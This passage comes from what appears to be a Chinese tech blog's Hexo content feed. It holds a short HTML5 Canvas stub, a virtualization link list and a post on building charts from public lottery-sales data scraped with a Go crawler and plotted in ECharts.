<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2019/03/17/International-Relations-Kaplan/" target="_blank" rel="noopener">行走的思想家:罗伯特·D.卡普兰</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Travel</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>Visualization-Canvas</title>
    <url>/2017/12/19/Visualization-Canvas/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong></p>
<a id="more"></a>
<p>HTML5 <canvas> 标签用于绘制图像（通过脚本，通常是 JavaScript）。不过，<canvas> 元素本身并没有绘制能力（它仅仅是图形的容器） ，您必须使用脚本来完成实际的绘图任务。</canvas></canvas></p>
<p>Canvas 的默认大小为300像素×150像素（宽×高，像素的单位是px）。但是，可以使用HTML的高度和宽度属性来自定义Canvas 的尺寸。为了在 Canvas 上绘制图形，我们使用一个JavaScript上下文对象，它能动态创建图像（ creates graphics on the fly）。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"canvas"</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line"><span class="keyword">var</span> ctx = canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line"></span><br><span class="line">ctx.fillStyle = <span class="string">'green'</span>;</span><br><span class="line">ctx.fillRect(<span class="number">10</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul>
<li><a href="https://github.com/gchq/iris-worm" target="_blank" rel="noopener">An HTML 5 Canvas API :IRIS Worm is a real-time data graphing component</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.w3school.com.cn/tags/html_ref_canvas.asp" target="_blank" rel="noopener">HTML 5 Canvas 参考手册</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>虚拟化 | Overview of Virtualization</title>
    <url>/2017/05/12/Virtualization/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong></p>
<a id="more"></a>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://semaphoreci.com/docs/adding-github-bitbucket-project-to-semaphore.html?utm_source=intercom-getting-started&amp;utm_medium=email&amp;utm_campaign=getting-started-welcome" target="_blank" rel="noopener">semaphoreci.com</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTAzMDEwMA==&amp;mid=403453780&amp;idx=1&amp;sn=cc4b4e46a733daf7089b5d29b5a2e6bb&amp;scene=1&amp;srcid=0104peuQfG57d232UVQ69oly#rd" target="_blank" rel="noopener">中兴刘超年：虚拟化交换机性能优化探讨实录</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（五）基于网络爬虫制作可视化图表</title>
    <url>/2017/05/12/Visualization-Charts/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>基于网络爬虫的可视化图表:golang,goquery</li>
<li>案例：最近十年全国彩票销售变化情况</li>
<li>案例：中国科学院院士分布</li>
<li>数据可视化技术方案:基于 SVG (D3、Raphael)、基于 Canvas（Echarts）</li>
</ul>
<span id="more"></span>
<h2 id="基于网络爬虫的可视化图表"><a href="#基于网络爬虫的可视化图表" class="headerlink" title="基于网络爬虫的可视化图表"></a>基于网络爬虫的可视化图表</h2><p>我们身处大数据时代，几乎在所有工作例如商业技术、金融、科研教育等行业，以及日常生活中都可能需要涉及数据分析活动。横向来看数据分析的知识体系贯穿数据获取、数据存储、数据分析、数据挖掘、数据可视化等各大部分；按数据来源分，即可以是自己收集的数据，也可以采购数据或者基于公开数据集。</p>
<p>基于公开数据进行分析的话，必须提到的就是网络爬虫（web crawler），也被称作网络蜘蛛（spider）、自动索引程序（automatic indexer），搜索引擎（Google，百度等）就是大众日常生活中接触到的最典型、最强大的爬虫。</p>
<p>公开数据包括政府（统计局、央行、银监会、证监会等）、企业、社会组织和互联网上的个人发布信息等。在浩如烟海的互联网内容中，有价值信息犹如‘待字闺中’深藏的美女，等待有心人去挖掘。例如：</p>
<ul>
<li>案例：最近十年全国彩票销售变化情况 <a href="https://riboseyim.github.io/charts/caipiao/index.html">在线演示</a></li>
<li>案例：中国科学院院士分布（出生地与籍贯）<a href="https://riboseyim.github.io/charts/casad/index.html">在线演示</a></li>
<li>案例：美国航空入境旅客（出发地）变化情况 <a href="https://riboseyim.github.io/charts/usa-traffic/index.html">在线演示</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E9%99%A2%C2%B7%E9%99%A2%E5%A3%AB%E5%88%86%E5%B8%83%E6%83%85%E5%86%B5%C2%B7201801.png" alt="中科院院士分布情况|201801"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-3.png" alt="全国彩票销售情况"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/usa-traffic-1980.png" alt=""></p>
<p>为了实现上述图表，相关技术方案的要点如下：</p>
<ul>
<li>开发语言：<br>基于 <a href="https://riboseyim.github.io/2017/05/05/Language-Go-lang/">Golang</a> 实现爬虫基本功能，主要考虑 <a href="https://riboseyim.github.io/2017/05/05/Language-Go-lang/">Go 语言</a> 自身对于网络方面的强大支持，语言级 Goroutines 提供并发高性能支持。</li>
<li>HTML选择器: <strong>goquery</strong> jQuery-style HTML manipulation in Go</li>
<li>数据存储: csv,<a href="https://riboseyim.github.io/2018/01/03/OpenSource-DB-PostgreSQL/">PostgreSQL</a> 等</li>
<li>数据可视化：<strong>ECharts</strong></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E5%A4%A9%E5%AE%98%E8%B5%90%E7%A6%8F.png" alt="基于网络爬虫制作可视化图表"></p>
<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>数据来源页面：</p>
<ul>
<li><a href="http://zhs.mof.gov.cn/zhuantilanmu/caipiaoguanli/">专栏：彩票管理</a></li>
<li><a href="http://zhs.mof.gov.cn/zhuantilanmu/caipiaoguanli/201712/t20171221_2786493.html">2017年11月份全国彩票销售情况</a></li>
<li><a href="http://www.casad.cas.cn/chnl/371/index.html">全体院士名单</a></li>
<li><a href="http://www.casad.cas.cn/aca/371/sxwlxb-200906-t20090626_1854608.html">院士个人介绍</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-process-4-min.png" alt="数据来源-专题"><br><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-process-3.png" alt="数据来源-内容"><br><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-process-5.png" alt="数据来源-翻页"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-process-2.png" alt="数据来源页面-源代码"><br><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-process-1.png" alt="数据来源页面-源代码"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//caipiao_task.go</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Handle_GMOF_CaiPiao_Month_BatchTask</span><span class="params">()</span></span> &#123;</span><br><span class="line">	data := read_csv_caipiao(<span class="string">&quot;./data/caipiao_list.csv&quot;</span>, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> data != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> i := <span class="keyword">range</span> data &#123;</span><br><span class="line">			<span class="keyword">go</span> Handle_GMOF_CaiPiao_Month_Task(url)</span><br><span class="line">		&#125;</span><br><span class="line">		&lt;-time.After(<span class="number">60</span> * time.Second)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Handle_GMOF_CaiPiao_Month_Task</span><span class="params">(url <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> url != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		myspider := init_GMOF_CaiPiao_Month_HTMLSpider(url)</span><br><span class="line">		ctx, _ := myspider.Setup(<span class="literal">nil</span>)</span><br><span class="line">		myspider.Spin(ctx)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//caipiao_spider.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/PuerkitoBio/goquery&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/celrenheit/spider&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GMOF_CaiPiao_Month_HTMLSpider <span class="keyword">struct</span> &#123;</span><br><span class="line">	title <span class="keyword">string</span> <span class="string">`json:&quot;title&quot;`</span></span><br><span class="line">	url   <span class="keyword">string</span> <span class="string">`json:&quot;url&quot;`</span></span><br><span class="line">	desc  <span class="keyword">string</span> <span class="string">`json:&quot;desc&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init_GMOF_CaiPiao_Month_HTMLSpider</span><span class="params">(url <span class="keyword">string</span>)</span> *<span class="title">GMOF_CaiPiao_Month_HTMLSpider</span></span> &#123;</span><br><span class="line">	spider := NewGMOF_CaiPiao_Month_HTMLSpider()</span><br><span class="line">	spider.url = url</span><br><span class="line">	<span class="keyword">return</span> spider</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *GMOF_CaiPiao_Month_HTMLSpider)</span> <span class="title">Setup</span><span class="params">(ctx *spider.Context)</span> <span class="params">(*spider.Context, error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> spider.NewHTTPContext(<span class="string">&quot;GET&quot;</span>, w.url, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *GMOF_CaiPiao_Month_HTMLSpider)</span> <span class="title">Spin</span><span class="params">(ctx *spider.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> _, err := ctx.DoRequest(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	html, err := ctx.HTMLParser()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	caipiao := NewGMOF_CaiPiao_Month()</span><br><span class="line"></span><br><span class="line">	<span class="comment">//&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line">	caipiao.Title = html.Find(<span class="string">&quot;title&quot;</span>).Eq(<span class="number">0</span>).Text()</span><br><span class="line">	caipiao.Title = Convert2String(caipiao.Title, GB18030)</span><br><span class="line">	<span class="comment">//class=&quot;TRS_Editor&quot;</span></span><br><span class="line">	html.Find(<span class="string">&quot;.TRS_Editor&quot;</span>).Each(<span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, s *goquery.Selection)</span></span> &#123;</span><br><span class="line">		content := s.Find(<span class="string">&quot;p&quot;</span>).Text()</span><br><span class="line">		caipiao.Content = content</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> content != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			content = Convert2String(content, GB18030)</span><br><span class="line">			rows := strings.Split(content, <span class="string">&quot;。&quot;</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> _, value := <span class="keyword">range</span> rows &#123;</span><br><span class="line">				<span class="comment">//fmt.Printf(&quot;======arr[%d]=\n [%s] \n&quot;, index, value)</span></span><br><span class="line">				<span class="keyword">if</span> strings.Index(value, <span class="string">&quot;全国彩票&quot;</span>) &gt; <span class="number">0</span> &#123;</span><br><span class="line">					reg := regexp.MustCompile(<span class="string">`全国共销售彩票([\d]+.[\d]+)\S+`</span>)</span><br><span class="line">					result := reg.FindStringSubmatch(value)</span><br><span class="line">					<span class="keyword">if</span> <span class="built_in">len</span>(result) &gt; <span class="number">0</span> &#123;</span><br><span class="line">						caipiao.Total = result[<span class="number">1</span>]</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//id=&quot;appendix&quot;</span></span><br><span class="line">	html.Find(<span class="string">&quot;#appendix&quot;</span>).Each(<span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, s *goquery.Selection)</span></span> &#123;</span><br><span class="line">		href, _ := s.Find(<span class="string">&quot;a&quot;</span>).Eq(<span class="number">0</span>).Attr(<span class="string">&quot;href&quot;</span>) <span class="comment">//附件</span></span><br><span class="line">		caipiao.Attachid = href</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//===== export data</span></span><br><span class="line">	save_csv(<span class="string">&quot;./data/caipiao_result.csv&quot;</span>, caipiao)</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>2017年11月份全国彩票销售情况,385.55<br>2017年10月份全国彩票销售情况,376.53<br>2017年9月份全国彩票销售情况,369.28<br>2017年8月份全国彩票销售情况,350.67<br>2017年7月份全国彩票销售情况,337.55<br>2017年6月份全国彩票销售情况,338.42</p>
</blockquote>
<h4 id="可视化图表：以-ECharts-为例"><a href="#可视化图表：以-ECharts-为例" class="headerlink" title="可视化图表：以 ECharts 为例"></a>可视化图表：以 ECharts 为例</h4><p><strong>常见的图表库</strong>，本文案例使用 ECharts 作为图表组件</p>
<ul>
<li><a href="http://www.highcharts.com">HighCharts</a>：JavaScript 编写，开源许可证允许个人用户和非商业用途。</li>
<li><a href="http://echarts.baidu.com">Baidu ECharts</a>：底层画图基于 Canvas, BSD 许可证协议。</li>
<li><a href="http://www.oschina.net/p/kartograph?fromerr=tZ15BKGv">Kartograph</a>：构建交互式地图轻量级类库。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//http://echarts.baidu.com/demo.html#line-gradient</span></span><br><span class="line">data = [[<span class="string">&quot;2017年11月&quot;</span>,<span class="number">385.55</span>],[<span class="string">&quot;2017年10月&quot;</span>,<span class="number">376.53</span>],[<span class="string">&quot;2017年9月&quot;</span>,<span class="number">369.28</span>],[<span class="string">&quot;2017年8月&quot;</span>,<span class="number">350.67</span>],[<span class="string">&quot;2017年7月&quot;</span>,<span class="number">337.55</span>],[<span class="string">&quot;2017年6月&quot;</span>,<span class="number">338.42</span>],[<span class="string">&quot;2017年11月&quot;</span>,<span class="number">385.55</span>],[<span class="string">&quot;2017年10月&quot;</span>,<span class="number">376.53</span>],[<span class="string">&quot;2017年9月&quot;</span>,<span class="number">369.28</span>],[<span class="string">&quot;2017年8月&quot;</span>,<span class="number">350.67</span>],[<span class="string">&quot;2017年7月&quot;</span>,<span class="number">337.55</span>],[<span class="string">&quot;2017年6月&quot;</span>,<span class="number">338.42</span>],[<span class="string">&quot;2017年11月&quot;</span>,<span class="number">385.55</span>],[<span class="string">&quot;2017年10月&quot;</span>,<span class="number">376.53</span>],[<span class="string">&quot;2017年9月&quot;</span>,<span class="number">369.28</span>],[<span class="string">&quot;2017年8月&quot;</span>,<span class="number">350.67</span>],[<span class="string">&quot;2017年7月&quot;</span>,<span class="number">337.55</span>],[<span class="string">&quot;2017年6月&quot;</span>,<span class="number">338.42</span>],[<span class="string">&quot;2017年5月&quot;</span>,<span class="number">376.95</span>],[<span class="string">&quot;2017年4月&quot;</span>,<span class="number">382.45</span>],[<span class="string">&quot;2017年3月&quot;</span>,<span class="number">379.33</span>],[<span class="string">&quot;2017年2月&quot;</span>,<span class="number">0</span>],[<span class="string">&quot;2017年1月&quot;</span>,<span class="number">291.61</span>],[<span class="string">&quot;2016年12月&quot;</span>,<span class="number">365.94</span>],[<span class="string">&quot;2016年11月&quot;</span>,<span class="number">344.82</span>],[<span class="string">&quot;2016年10月&quot;</span>,<span class="number">338.27</span>],[<span class="string">&quot;2016年9月&quot;</span>,<span class="number">320.71</span>],[<span class="string">&quot;2016年8月&quot;</span>,<span class="number">310.12</span>],[<span class="string">&quot;2016年7月&quot;</span>,<span class="number">324.03</span>],[<span class="string">&quot;2016年6月&quot;</span>,<span class="number">339.61</span>],[<span class="string">&quot;2016年5月&quot;</span>,<span class="number">346.19</span>],[<span class="string">&quot;2016年4月&quot;</span>,<span class="number">348.89</span>],[<span class="string">&quot;2016年3月&quot;</span>,<span class="number">356.88</span>],[<span class="string">&quot;2016年2月&quot;</span>,<span class="number">224.54</span>],[<span class="string">&quot;2016年1月&quot;</span>,<span class="number">326.41</span>],[<span class="string">&quot;2015年12月&quot;</span>,<span class="number">341.21</span>],[<span class="string">&quot;2015年11月&quot;</span>,<span class="number">306.30</span>],[<span class="string">&quot;2015年10月&quot;</span>,<span class="number">312.34</span>],[<span class="string">&quot;2015年9月&quot;</span>,<span class="number">290.78</span>],[<span class="string">&quot;2015年8月&quot;</span>,<span class="number">280.96</span>],[<span class="string">&quot;2015年7月&quot;</span>,<span class="number">270.47</span>],[<span class="string">&quot;2015年6月&quot;</span>,<span class="number">281.2371</span>],[<span class="string">&quot;2015年5月&quot;</span>,<span class="number">321.07</span>],[<span class="string">&quot;2015年5月&quot;</span>,<span class="number">321.07</span>],[<span class="string">&quot;2015年4月&quot;</span>,<span class="number">326.12</span>],[<span class="string">&quot;2015年3月&quot;</span>,<span class="number">308.12</span>],[<span class="string">&quot;2015年2月&quot;</span>,<span class="number">247.90</span>],[<span class="string">&quot;2015年1月&quot;</span>,<span class="number">392.33</span>],[<span class="string">&quot;2014年12月&quot;</span>,<span class="number">361.53</span>],[<span class="string">&quot;2014年11月&quot;</span>,<span class="number">341.18</span>],[<span class="string">&quot;2014年10月&quot;</span>,<span class="number">327.01</span>],[<span class="string">&quot;2014年9月&quot;</span>,<span class="number">322.52</span>],[<span class="string">&quot;2014年8月&quot;</span>,<span class="number">315.36</span>],[<span class="string">&quot;2014年7月&quot;</span>,<span class="number">372.09</span>],[<span class="string">&quot;2014年6月&quot;</span>,<span class="number">360.54</span>],[<span class="string">&quot;2014年5月&quot;</span>,<span class="number">307.94</span>],[<span class="string">&quot;2014年4月&quot;</span>,<span class="number">315.29</span>],[<span class="string">&quot;2014年3月&quot;</span>,<span class="number">328.74</span>],[<span class="string">&quot;2014年2月&quot;</span>,<span class="number">200.1</span>],[<span class="string">&quot;2014年1月&quot;</span>,<span class="number">271.49</span>],[<span class="string">&quot;2013年12月&quot;</span>,<span class="number">302.73</span>],[<span class="string">&quot;2013年11月&quot;</span>,<span class="number">274.16</span>],[<span class="string">&quot;2013年10月&quot;</span>,<span class="number">271.83</span>],[<span class="string">&quot;2013年9月&quot;</span>,<span class="number">257.62</span>],[<span class="string">&quot;2013年8月&quot;</span>,<span class="number">246.18</span>],[<span class="string">&quot;2013年7月&quot;</span>,<span class="number">243.65</span>],[<span class="string">&quot;2013年6月&quot;</span>,<span class="number">247.46</span>],[<span class="string">&quot;2013年5月&quot;</span>,<span class="number">273.41</span>],[<span class="string">&quot;2013年4月&quot;</span>,<span class="number">285.61</span>],[<span class="string">&quot;2013年3月&quot;</span>,<span class="number">273.37</span>],[<span class="string">&quot;2013年2月&quot;</span>,<span class="number">168.65</span>],[<span class="string">&quot;2013年1月&quot;</span>,<span class="number">248.59</span>],[<span class="string">&quot;2012年12月&quot;</span>,<span class="number">268.01</span>],[<span class="string">&quot;2012年11月&quot;</span>,<span class="number">237.06</span>],[<span class="string">&quot;2012年10月&quot;</span>,<span class="number">215.38</span>],[<span class="string">&quot;2012年9月&quot;</span>,<span class="number">205.12</span>],[<span class="string">&quot;2012年8月&quot;</span>,<span class="number">197.12</span>],[<span class="string">&quot;2012年7月&quot;</span>,<span class="number">201.98</span>],[<span class="string">&quot;2012年6月&quot;</span>,<span class="number">216.14</span>],[<span class="string">&quot;2012年5月&quot;</span>,<span class="number">236.16</span>],[<span class="string">&quot;2012年4月&quot;</span>,<span class="number">235.76</span>],[<span class="string">&quot;2012年3月&quot;</span>,<span class="number">235.79</span>],[<span class="string">&quot;2012年2月&quot;</span>,<span class="number">202.17</span>],[<span class="string">&quot;2012年1月&quot;</span>,<span class="number">164.54</span>],[<span class="string">&quot;2011年12月&quot;</span>,<span class="number">224.80</span>],[<span class="string">&quot;2011年11月&quot;</span>,<span class="number">210.08</span>],[<span class="string">&quot;2011年10月&quot;</span>,<span class="number">203.28</span>],[<span class="string">&quot;2011年9月&quot;</span>,<span class="number">196.44</span>],[<span class="string">&quot;2011年8月&quot;</span>,<span class="number">187.72</span>],[<span class="string">&quot;2011年7月&quot;</span>,<span class="number">182.05</span>],[<span class="string">&quot;2011年6月&quot;</span>,<span class="number">174.53</span>],[<span class="string">&quot;2011年5月&quot;</span>,<span class="number">187.28</span>],[<span class="string">&quot;2011年3月&quot;</span>,<span class="number">190.12</span>],[<span class="string">&quot;2011年2月&quot;</span>,<span class="number">112.92</span>],[<span class="string">&quot;2011年1月&quot;</span>,<span class="number">160.09</span>],[<span class="string">&quot;2010年12月&quot;</span>,<span class="number">171.89</span>],[<span class="string">&quot;2010年11月&quot;</span>,<span class="number">160.24</span>],[<span class="string">&quot;2010年10月&quot;</span>,<span class="number">149.95</span>],[<span class="string">&quot;2010年9月&quot;</span>,<span class="number">139.56</span>],[<span class="string">&quot;2011年4月&quot;</span>,<span class="number">186.50</span>],[<span class="string">&quot;2010年8月&quot;</span>,<span class="number">135.75</span>],[<span class="string">&quot;2010年7月&quot;</span>,<span class="number">132.74</span>],[<span class="string">&quot;2010年6月&quot;</span>,<span class="number">140.71</span>],[<span class="string">&quot;2010年5月&quot;</span>,<span class="number">144.38</span>],[<span class="string">&quot;2010年4月&quot;</span>,<span class="number">141.05</span>],[<span class="string">&quot;2010年3月&quot;</span>,<span class="number">132.52</span>],[<span class="string">&quot;2010年2月&quot;</span>,<span class="number">86.71</span>],[<span class="string">&quot;2010年1月&quot;</span>,<span class="number">126.99</span>],[<span class="string">&quot;2009年12月&quot;</span>,<span class="number">133.30</span>],[<span class="string">&quot;2009年11月&quot;</span>,<span class="number">117.05</span>],[<span class="string">&quot;2009年10月&quot;</span>,<span class="number">116.47</span>],[<span class="string">&quot;2009年9月&quot;</span>,<span class="number">111.73</span>],[<span class="string">&quot;2009年8月&quot;</span>,<span class="number">110.64</span>],[<span class="string">&quot;2009年7月&quot;</span>,<span class="number">107.87</span>],[<span class="string">&quot;2009年6月&quot;</span>,<span class="number">113.51</span>],[<span class="string">&quot;2009年5月&quot;</span>,<span class="number">121.59</span>],[<span class="string">&quot;2009年4月&quot;</span>,<span class="number">114.61</span>],[<span class="string">&quot;2009年3月&quot;</span>,<span class="number">114.49</span>],[<span class="string">&quot;2009年2月&quot;</span>,<span class="number">89.21</span>],[<span class="string">&quot;2009年1月&quot;</span>,<span class="number">74.33</span>],[<span class="string">&quot;2008年12月&quot;</span>,<span class="number">102.07</span>],[<span class="string">&quot;2008年11月&quot;</span>,<span class="number">94.09</span>],[<span class="string">&quot;2008年10月&quot;</span>,<span class="number">79.88</span>],[<span class="string">&quot;2008年8月&quot;</span>,<span class="number">84.66</span>]];</span><br><span class="line"><span class="keyword">var</span> dateList = data.map(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item[<span class="number">0</span>];</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> valueList = data.map(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item[<span class="number">1</span>];</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">option = &#123;</span><br><span class="line">    <span class="comment">// Make gradient line here</span></span><br><span class="line">    <span class="attr">visualMap</span>: [&#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;continuous&#x27;</span>,</span><br><span class="line">        <span class="attr">seriesIndex</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">min</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">max</span>: <span class="number">400</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;continuous&#x27;</span>,</span><br><span class="line">        <span class="attr">seriesIndex</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">dimension</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">min</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">max</span>: dateList.length - <span class="number">1</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="attr">title</span>: [&#123;</span><br><span class="line">        <span class="attr">left</span>: <span class="string">&#x27;center&#x27;</span>,</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&#x27;Gradient along the y axis&#x27;</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">top</span>: <span class="string">&#x27;55%&#x27;</span>,</span><br><span class="line">        <span class="attr">left</span>: <span class="string">&#x27;center&#x27;</span>,</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&#x27;Gradient along the x axis&#x27;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="attr">tooltip</span>: &#123;</span><br><span class="line">        <span class="attr">trigger</span>: <span class="string">&#x27;axis&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">xAxis</span>: [&#123;</span><br><span class="line">        <span class="attr">data</span>: dateList</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">data</span>: dateList,</span><br><span class="line">        <span class="attr">gridIndex</span>: <span class="number">1</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="attr">yAxis</span>: [&#123;</span><br><span class="line">        <span class="attr">splitLine</span>: &#123;<span class="attr">show</span>: <span class="literal">false</span>&#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">splitLine</span>: &#123;<span class="attr">show</span>: <span class="literal">false</span>&#125;,</span><br><span class="line">        <span class="attr">gridIndex</span>: <span class="number">1</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="attr">grid</span>: [&#123;</span><br><span class="line">        <span class="attr">bottom</span>: <span class="string">&#x27;60%&#x27;</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">top</span>: <span class="string">&#x27;60%&#x27;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="attr">series</span>: [&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;line&#x27;</span>,</span><br><span class="line">        <span class="attr">showSymbol</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">data</span>: valueList</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;line&#x27;</span>,</span><br><span class="line">        <span class="attr">showSymbol</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">data</span>: valueList,</span><br><span class="line">        <span class="attr">xAxisIndex</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">yAxisIndex</span>: <span class="number">1</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><ul>
<li>默认调色板(palette)</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Coror-Default.png" alt=""></p>
